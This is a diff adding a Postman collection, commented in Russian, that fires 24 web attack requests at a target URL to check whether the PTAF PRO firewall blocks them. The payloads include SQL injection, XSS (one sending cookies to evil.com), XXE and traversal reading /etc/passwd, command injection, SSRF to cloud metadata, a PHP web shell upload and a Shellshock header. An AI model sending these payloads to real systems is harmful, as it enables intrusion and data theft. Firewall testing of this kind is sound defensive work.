@@ -1,0 +1,921 @@
+{
+	"info": {
+		"_postman_id": "1234567-89ab-cdef-1234-567890abcdef",
+		"name": "PTAF PRO Test Attacks Collection",
+		"description": "Коллекция тестов для проверки эффективности PTAF PRO",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"version": "2.0"
+	},
+	"item": [
+		{
+			"name": "🚀 Run All Tests",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"type": "text/javascript",
+						"exec": [
+							"console.log('🚀 Начинаем тестирование PTAF PRO...');",
+							"",
+							"// Проверяем и устанавливаем base_url",
+							"if (!pm.variables.get('base_url')) {",
+							"    pm.variables.set('base_url', 'https://msproject.site.net/console');",
+							"    console.log('ℹ️ base_url установлен по умолчанию');",
+							"}",
+							"",
+							"// Проверяем остальные переменные",
+							"const requiredVars = ['modern_user_agent', 'automated_bot_user_agent', 'vuln_scanner_user_agent', 'test_payload_size', 'jwt_token_none_alg'];",
+							"requiredVars.forEach(varName => {",
+							"    if (!pm.variables.get(varName)) {",
+							"        const defaultValues = {",
+							"            modern_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',",
+							"            automated_bot_user_agent: 'Googlebot/2.1 (+http://www.google.com/bot.html)',",
+							"            vuln_scanner_user_agent: 'Nessus SOAP',",
+							"            test_payload_size: '10000',",
+							"            jwt_token_none_alg: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.'",
+							"        };",
+							"        pm.variables.set(varName, defaultValues[varName]);",
+							"        console.log(`ℹ️ ${varName} установлен по умолчанию`);",
+							"    }",
+							"});",
+							"",
+							"// Инициализация тестов при первом запуске",
+							"if (!pm.collectionVariables.get('currentTestIndex')) {",
+							"    const testRequests = [",
+							"        { name: '1. SQL Injection', url: '{{base_url}}/search?q=1%27+OR+%271%27%3D%271' },",
+							"        { name: '2. Cross-Site Scripting (HTML)', method: 'POST', url: '{{base_url}}/search', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'q=<script>alert(1)</script>' },",
+							"        { name: '3. Cross-Site Scripting (URL)', url: '{{base_url}}/redirect?url=javascript:alert(1)' },",
+							"        { name: '4. XML External Entities (XXE)', method: 'POST', url: '{{base_url}}/api/xml', headers: { 'Content-Type': 'application/xml' }, body: '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>' },",
+							"        { name: '5. Path Traversal', url: '{{base_url}}/files?file=../../../etc/passwd' },",
+							"        { name: '6. NoSQL Injection', method: 'POST', url: '{{base_url}}/search', headers: { 'Content-Type': 'application/json' }, body: '{\"search\": {\"$where\": \"function() { return true; }\"}, \"limit\": 1}' },",
+							"        { name: '7. OS Command Injection', url: '{{base_url}}/status?cmd=ping;cat%20/etc/passwd' },",
+							"        { name: '8. Server-Side Request Forgery', url: '{{base_url}}/proxy?url=http://169.254.169.254/latest/meta-data/' },",
+							"        { name: '9. Local File Inclusion', url: '{{base_url}}/include?file=../../../etc/passwd%00' },",
+							"        { name: '10. Server-Side Template Injection', method: 'POST', url: '{{base_url}}/profile', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'name={{7*7}}&email=test@example.com' },",
+							"        { name: '11. XPath Injection', url: '{{base_url}}/users?xpath=/users/user[username/text()=%27admin%27%20or%20%271%27=%271%27]' },",
+							"        { name: '12. XML Injection', method: 'POST', url: '{{base_url}}/api/xml', headers: { 'Content-Type': 'application/xml', 'Accept': 'application/xml', 'User-Agent': '{{vuln_scanner_user_agent}}' }, body: '<?xml version=\"1.0\" encoding=\"UTF-8\"?><user><id>1 OR 1=1</id><name>test\\' OR \\'1\\'=\\'1</name></user>' },",
+							"        { name: '13. Open Redirect', url: '{{base_url}}/redirect?url=http://evil.com/shell.php' },",
+							"        { name: '14. Web Shell Upload', method: 'POST', url: '{{base_url}}/upload', headers: { 'Content-Type': 'multipart/form-data; boundary=---------------------------974767299852498929531610575', 'User-Agent': '{{vuln_scanner_user_agent}}', 'X-Requested-With': 'XMLHttpRequest' }, body: '-----------------------------974767299852498929531610575\\r\\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.png\"\\r\\nContent-Type: image/png\\r\\n\\r\\nGIF87a;\\r\\n<?php\\r\\n  system(\\'id\\');\\r\\n?>\\r\\n-----------------------------974767299852498929531610575--' },",
+							"        { name: '15. Cross-Site Request Forgery', method: 'POST', url: '{{base_url}}/login', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'evil.com', 'Referer': 'evil.com/csrf.html' }, body: 'username=<script>document.location=\\'https://evil.com?cookie=\\'+document.cookie</script>&password=test' },",
+							"        { name: '16. Vulnerability Scanner', url: '{{base_url}}/include?file=../../../../etc/passwd%00', headers: { 'User-Agent': '{{vuln_scanner_user_agent}}' } },",
+							"        { name: '17. Automated Bot User Agent', method: 'POST', url: '{{base_url}}/search', headers: { 'Content-Type': 'application/json', 'User-Agent': '{{automated_bot_user_agent}}' }, body: '{\"search\": {\"$where\": \"function() { return true; }\"}, \"limit\": 1}' },",
+							"        { name: '18. Malformed HTTP Request', url: '{{base_url}}/files?file=../../../etc/passwd', headers: { 'X-Custom-IP-Authorization': '127.0.0.1' } },",
+							"        { name: '19. Response Splitting', url: '{{base_url}}/include?file=http://evil.com/shell.php' },",
+							"        { name: '20. JWT Attack (None Algorithm)', url: '{{base_url}}/api/admin', headers: { 'Authorization': 'Bearer {{jwt_token_none_alg}}' } },",
+							"        { name: '21. Large Body Test', method: 'POST', url: '{{base_url}}/api/data', headers: { 'Content-Type': 'application/json' }, body: '{\"data\": \"A\".repeat(50000)}' },",
+							"        { name: '22. LFI with PHP Wrapper', url: '{{base_url}}/download?file=php://filter/convert.base64-encode/resource={{test_file_path}}' },",
+							"        { name: '23. RCE via User-Agent', url: '{{base_url}}/', headers: { 'User-Agent': '() { :; }; /bin/bash -c \"cat /etc/passwd\"' } },",
+							"        { name: '24. GraphQL Introspection', method: 'POST', url: '{{base_url}}/graphql', headers: { 'Content-Type': 'application/json' }, body: '{\"query\": \"query{__schema{types{name,fields{name}}}}\" }' }",
+							"    ];",
+							"    ",
+							"    pm.collectionVariables.set('testRequests', JSON.stringify(testRequests));",
+							"    pm.collectionVariables.set('currentTestIndex', '0');",
+							"    pm.collectionVariables.set('testResults', JSON.stringify([]));",
+							"    console.log(`🎯 Найдено ${testRequests.length} тестов`);",
+							"}",
+							"",
+							"// Функция для выполнения одного теста",
+							"async function runTest(test) {",
+							"    const request = {",
+							"        url: pm.variables.replaceIn(test.url),",
+							"        method: test.method || 'GET',",
+							"        header: {",
+							"            'User-Agent': pm.variables.get('modern_user_agent'),",
+							"            ...(test.headers || {})",
+							"        },",
+							"        timeout: 10000, // 10 секунд таймаут",
+							"        disableBodyPruning: true",
+							"    };",
+							"    ",
+							"    if (test.body) {",
+							"        request.body = {",
+							"            mode: 'raw',",
+							"            raw: pm.variables.replaceIn(test.body)",
+							"        };",
+							"    }",
+							"    ",
+							"    try {",
+							"        const response = await new Promise((resolve, reject) => {",
+							"            pm.sendRequest(request, (err, res) => {",
+							"                if (err) reject(err);",
+							"                else resolve(res);",
+							"            });",
+							"        });",
+							"        ",
+							"        const isBlocked = response.code === 403;",
+							"        const status = isBlocked ? '✅' : '❌';",
+							"        const statusEmoji = isBlocked ? '🛡️' : '⚠️';",
+							"        console.log(`${statusEmoji} ${test.name} - ${status} Status: ${response.code}`);",
+							"        if (response.headers.get('Transaction-ID')) {",
+							"            console.log(`   🔑 Transaction ID: ${response.headers.get('Transaction-ID')}`);",
+							"        }",
+							"        ",
+							"        // Сохраняем результат теста",
+							"        const testResults = JSON.parse(pm.collectionVariables.get('testResults'));",
+							"        testResults.push({",
+							"            name: test.name,",
+							"            status: isBlocked ? 'blocked' : 'allowed',",
+							"            code: response.code,",
+							"            transactionId: response.headers.get('Transaction-ID')",
+							"        });",
+							"        pm.collectionVariables.set('testResults', JSON.stringify(testResults));",
+							"        ",
+							"        // Ждем 1 секунду перед следующим тестом",
+							"        await new Promise(resolve => setTimeout(resolve, 1000));",
+							"        ",
+							"        return true;",
+							"    } catch (err) {",
+							"        console.log(`❌ Ошибка в тесте ${test.name}:`, err);",
+							"        ",
+							"        // Сохраняем результат теста с ошибкой",
+							"        const testResults = JSON.parse(pm.collectionVariables.get('testResults'));",
+							"        testResults.push({",
+							"            name: test.name,",
+							"            status: 'error',",
+							"            error: err.message",
+							"        });",
+							"        pm.collectionVariables.set('testResults', JSON.stringify(testResults));",
+							"        ",
+							"        return false;",
+							"    }",
+							"}",
+							"",
+							"// Функция для вывода отчета",
+							"function printReport(testResults) {",
+							"    console.log('\\n📊 ====== ОТЧЕТ О ТЕСТИРОВАНИИ PTAF PRO ======\\n');",
+							"    ",
+							"    const blocked = testResults.filter(r => r.status === 'blocked').length;",
+							"    const allowed = testResults.filter(r => r.status === 'allowed').length;",
+							"    const errors = testResults.filter(r => r.status === 'error').length;",
+							"    ",
+							"    console.log(`🎯 Всего тестов: ${testResults.length}`);",
+							"    console.log(`🛡️ Успешно заблокировано: ${blocked}`);",
+							"    console.log(`⚠️ Разрешено (не заблокировано): ${allowed}`);",
+							"    console.log(`❌ Ошибок: ${errors}\\n`);",
+							"    ",
+							"    console.log('📝 Детальный отчет по тестам:\\n');",
+							"    testResults.forEach((result, index) => {",
+							"        const statusEmoji = result.status === 'blocked' ? '🛡️' : result.status === 'allowed' ? '⚠️' : '❌';",
+							"        const statusText = result.status === 'blocked' ? 'Заблокирован' : result.status === 'allowed' ? 'Разрешен' : 'Ошибка';",
+							"        console.log(`${statusEmoji} ${result.name}: ${statusText}`);",
+							"        if (result.transactionId) {",
+							"            console.log(`   🔑 Transaction ID: ${result.transactionId}`);",
+							"        }",
+							"        if (result.error) {",
+							"            console.log(`   ❌ Ошибка: ${result.error}`);",
+							"        }",
+							"    });",
+							"    ",
+							"    console.log('\\n🎯 ======================================\\n');",
+							"}",
+							"",
+							"// Функция для запуска всех тестов",
+							"async function runAllTests() {",
+							"    const testRequests = JSON.parse(pm.collectionVariables.get('testRequests'));",
+							"    const currentIndex = parseInt(pm.collectionVariables.get('currentTestIndex'));",
+							"    ",
+							"    if (currentIndex < testRequests.length) {",
+							"        const currentTest = testRequests[currentIndex];",
+							"        console.log(`🔄 Запуск теста ${currentIndex + 1}/${testRequests.length}: ${currentTest.name}`);",
+							"        ",
+							"        await runTest(currentTest);",
+							"        ",
+							"        // Увеличиваем индекс и сохраняем для следующего теста",
+							"        pm.collectionVariables.set('currentTestIndex', (currentIndex + 1).toString());",
+							"        ",
+							"        // Если это был последний тест, выводим отчет",
+							"        if (currentIndex + 1 >= testRequests.length) {",
+							"            console.log('✨ Все тесты выполнены!');",
+							"            const testResults = JSON.parse(pm.collectionVariables.get('testResults'));",
+							"            printReport(testResults);",
+							"            ",
+							"            // Очищаем переменные",
+							"            pm.collectionVariables.unset('testRequests');",
+							"            pm.collectionVariables.unset('currentTestIndex');",
+							"            pm.collectionVariables.unset('testResults');",
+							"        } else {",
+							"            // Запускаем следующий тест",
+							"            runAllTests();",
+							"        }",
+							"    }",
+							"}",
+							"",
+							"// Запускаем все тесты",
+							"runAllTests();"
+						]
+					}
+				},
+				{
+					"listen": "test",
+					"script": {
+						"type": "text/javascript",
+						"exec": [
+							"// Проверяем результат текущего теста",
+							"pm.test('PTAF PRO должен блокировать запрос', function() {",
+							"    pm.response.to.have.status(403);",
+							"    pm.response.to.have.body('Forbidden');",
+							"    const txId = pm.response.headers.get('Transaction-ID');",
+							"    pm.expect(txId).to.not.be.undefined;",
+							"    if (txId) {",
+							"        console.log('Transaction ID:', txId);",
+							"    }",
+							"});"
+						]
+					}
+				}
+			],
+			"request": {
+				"method": "GET",
+				"url": "{{base_url}}/search?q=1%27+OR+%271%27%3D%271",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				]
+			}
+		},
+		{
+			"name": "1. SQL Injection",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/search?q=1'+OR+'1'%3D'1",
+					"host": ["{{base_url}}"],
+					"path": ["search"],
+					"query": [
+						{
+							"key": "q",
+							"value": "1'+OR+'1'%3D'1"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "2. Cross-Site Scripting (HTML)",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					},
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "q=<script>alert(1)</script>"
+				},
+				"url": {
+					"raw": "{{base_url}}/search",
+					"host": ["{{base_url}}"],
+					"path": ["search"]
+				}
+			}
+		},
+		{
+			"name": "3. Cross-Site Scripting (URL)",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/redirect?url=javascript:alert(1)",
+					"host": ["{{base_url}}"],
+					"path": ["redirect"],
+					"query": [
+						{
+							"key": "url",
+							"value": "javascript:alert(1)"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "4. XML External Entities (XXE)",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					},
+					{
+						"key": "Content-Type",
+						"value": "application/xml"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<test>&xxe;</test>"
+				},
+				"url": {
+					"raw": "{{base_url}}/api/xml",
+					"host": ["{{base_url}}"],
+					"path": ["api", "xml"]
+				}
+			}
+		},
+		{
+			"name": "5. Path Traversal",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/files?file=../../../etc/passwd",
+					"host": ["{{base_url}}"],
+					"path": ["files"],
+					"query": [
+						{
+							"key": "file",
+							"value": "../../../etc/passwd"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "6. NoSQL Injection",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					},
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"search\": {\"$where\": \"function() { return true; }\"}, \"limit\": 1}"
+				},
+				"url": {
+					"raw": "{{base_url}}/search",
+					"host": ["{{base_url}}"],
+					"path": ["search"]
+				}
+			}
+		},
+		{
+			"name": "7. OS Command Injection",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/status?cmd=ping;cat%20/etc/passwd",
+					"host": ["{{base_url}}"],
+					"path": ["status"],
+					"query": [
+						{
+							"key": "cmd",
+							"value": "ping;cat%20/etc/passwd"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "8. Server-Side Request Forgery (SSRF)",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/proxy?url=http://169.254.169.254/latest/meta-data/",
+					"host": ["{{base_url}}"],
+					"path": ["proxy"],
+					"query": [
+						{
+							"key": "url",
+							"value": "http://169.254.169.254/latest/meta-data/"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "9. Local File Inclusion (LFI)",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/include?file=../../../etc/passwd%00",
+					"host": ["{{base_url}}"],
+					"path": ["include"],
+					"query": [
+						{
+							"key": "file",
+							"value": "../../../etc/passwd%00"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "10. Server-Side Template Injection (SSTI)",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					},
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "name={{7*7}}&email=test@example.com"
+				},
+				"url": {
+					"raw": "{{base_url}}/profile",
+					"host": ["{{base_url}}"],
+					"path": ["profile"]
+				}
+			}
+		},
+		{
+			"name": "11. XPath Injection",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/users?xpath=/users/user[username/text()='admin' or '1'='1']",
+					"host": ["{{base_url}}"],
+					"path": ["users"],
+					"query": [
+						{
+							"key": "xpath",
+							"value": "/users/user[username/text()='admin' or '1'='1']"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "12. XML Injection",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "sqlmap/1.4.7"
+					},
+					{
+						"key": "Content-Type",
+						"value": "application/xml"
+					},
+					{
+						"key": "Accept",
+						"value": "application/xml"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<user>\n  <id>1 OR 1=1</id>\n  <name>test' OR '1'='1</name>\n</user>"
+				},
+				"url": {
+					"raw": "{{base_url}}/api/xml",
+					"host": ["{{base_url}}"],
+					"path": ["api", "xml"]
+				}
+			}
+		},
+		{
+			"name": "13. Open Redirect",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/redirect?url=http://evil.com/shell.php",
+					"host": ["{{base_url}}"],
+					"path": ["redirect"],
+					"query": [
+						{
+							"key": "url",
+							"value": "http://evil.com/shell.php"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "14. Web Shell Upload",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "Nessus/8.10.1"
+					},
+					{
+						"key": "Content-Type",
+						"value": "multipart/form-data; boundary=---------------------------974767299852498929531610575"
+					},
+					{
+						"key": "X-Requested-With",
+						"value": "XMLHttpRequest"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "-----------------------------974767299852498929531610575\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.png\"\r\nContent-Type: image/png\r\n\r\nGIF87a;\r\n<?php\r\n  system('id');\r\n?>\r\n-----------------------------974767299852498929531610575--"
+				},
+				"url": {
+					"raw": "{{base_url}}/upload",
+					"host": ["{{base_url}}"],
+					"path": ["upload"]
+				}
+			}
+		},
+		{
+			"name": "15. Cross-Site Request Forgery (CSRF)",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					},
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded"
+					},
+					{
+						"key": "Origin",
+						"value": "evil.com"
+					},
+					{
+						"key": "Referer",
+						"value": "evil.com/csrf.html"
+					},
+					{
+						"key": "X-CSRF-Token",
+						"value": "invalid_token"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "username=admin&password=password&action=transfer&amount=1000&to=attacker"
+				},
+				"url": {
+					"raw": "{{base_url}}/login",
+					"host": ["{{base_url}}"],
+					"path": ["login"]
+				}
+			}
+		},
+		{
+			"name": "16. Vulnerability Scanner",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "Nessus SOAP"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/include?file=../../../../etc/passwd%00",
+					"host": ["{{base_url}}"],
+					"path": ["include"],
+					"query": [
+						{
+							"key": "file",
+							"value": "../../../../etc/passwd%00"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "17. Automated Bot User Agent",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "Googlebot/2.1 (+http://www.google.com/bot.html)"
+					},
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"search\": {\"$where\": \"function() { return true; }\"}, \"limit\": 1}"
+				},
+				"url": {
+					"raw": "{{base_url}}/search",
+					"host": ["{{base_url}}"],
+					"path": ["search"]
+				}
+			}
+		},
+		{
+			"name": "18. Malformed HTTP Request",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					},
+					{
+						"key": "X-Custom-IP-Authorization",
+						"value": "127.0.0.1"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/files?file=../../../etc/passwd",
+					"host": ["{{base_url}}"],
+					"path": ["files"],
+					"query": [
+						{
+							"key": "file",
+							"value": "../../../etc/passwd"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "19. Response Splitting",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/include?file=http://evil.com/shell.php",
+					"host": ["{{base_url}}"],
+					"path": ["include"],
+					"query": [
+						{
+							"key": "file",
+							"value": "http://evil.com/shell.php"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "20. JWT Attack (None Algorithm)",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					},
+					{
+						"key": "Authorization",
+						"value": "Bearer {{jwt_token_none_alg}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/api/admin?alg=none&debug=true",
+					"host": ["{{base_url}}"],
+					"path": ["api", "admin"],
+					"query": [
+						{
+							"key": "alg",
+							"value": "none"
+						},
+						{
+							"key": "debug",
+							"value": "true"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "21. Large Body Test",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					},
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"data\": \"A\".repeat(50000)}"
+				},
+				"url": {
+					"raw": "{{base_url}}/api/data",
+					"host": ["{{base_url}}"],
+					"path": ["api", "data"]
+				}
+			}
+		},
+		{
+			"name": "22. LFI with PHP Wrapper",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/download?file=php://filter/convert.base64-encode/resource=/etc/passwd&type=lfi",
+					"host": ["{{base_url}}"],
+					"path": ["download"],
+					"query": [
+						{
+							"key": "file",
+							"value": "php://filter/convert.base64-encode/resource=/etc/passwd"
+						},
+						{
+							"key": "type",
+							"value": "lfi"
+						}
+					]
+				}
+			}
+		},
+		{
+			"name": "23. RCE via User-Agent",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "() { :; }; /bin/bash -c \"cat /etc/passwd\""
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/",
+					"host": ["{{base_url}}"],
+					"path": ["/"]
+				}
+			}
+		},
+		{
+			"name": "24. GraphQL Introspection",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "{{modern_user_agent}}"
+					},
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"query\": \"query{__schema{types{name,fields{name}}}}\"}"
+				},
+				"url": {
+					"raw": "{{base_url}}/graphql",
+					"host": ["{{base_url}}"],
+					"path": ["graphql"]
+				}
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "base_url",
+			"value": "https://msproject.site.net/console",
+			"type": "string",
+			"description": "Базовый URL приложения для тестирования"
+		},
+		{
+			"key": "modern_user_agent",
+			"value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+			"type": "string",
+			"description": "Современный User-Agent для запросов"
+		},
+		{
+			"key": "vuln_scanner_user_agent",
+			"value": "Nessus SOAP",
+			"type": "string",
+			"description": "User-Agent сканера уязвимостей"
+		},
+		{
+			"key": "automated_bot_user_agent",
+			"value": "Googlebot/2.1 (+http://www.google.com/bot.html)",
+			"type": "string",
+			"description": "User-Agent автоматизированного бота"
+		},
+		{
+			"key": "evil_domain",
+			"value": "evil.com",
+			"type": "string",
+			"description": "Домен злоумышленника для CSRF и других атак"
+		},
+		{
+			"key": "test_file_path",
+			"value": "/etc/passwd",
+			"type": "string",
+			"description": "Путь к тестовому файлу для LFI и Path Traversal"
+		},
+		{
+			"key": "internal_ip",
+			"value": "169.254.169.254",
+			"type": "string",
+			"description": "Внутренний IP для SSRF тестов"
+		},
+		{
+			"key": "content_type_json",
+			"value": "application/json",
+			"type": "string",
+			"description": "Content-Type для JSON запросов"
+		},
+		{
+			"key": "content_type_xml",
+			"value": "application/xml",
+			"type": "string",
+			"description": "Content-Type для XML запросов"
+		},
+		{
+			"key": "content_type_form",
+			"value": "application/x-www-form-urlencoded",
+			"type": "string",
+			"description": "Content-Type для form-urlencoded запросов"
+		},
+		{
+			"key": "jwt_token_none_alg",
+			"value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.",
+			"type": "string",
+			"description": "JWT токен с алгоритмом none для атак"
+		},
+		{
+			"key": "test_payload_size",
+			"value": "10000",
+			"type": "string",
+			"description": "Размер тестового payload для Buffer Overflow"
+		},
+		{
+			"key": "graphql_endpoint",
+			"value": "/graphql",
+			"type": "string",
+			"description": "Эндпоинт GraphQL"
+		}
+	]
+} 
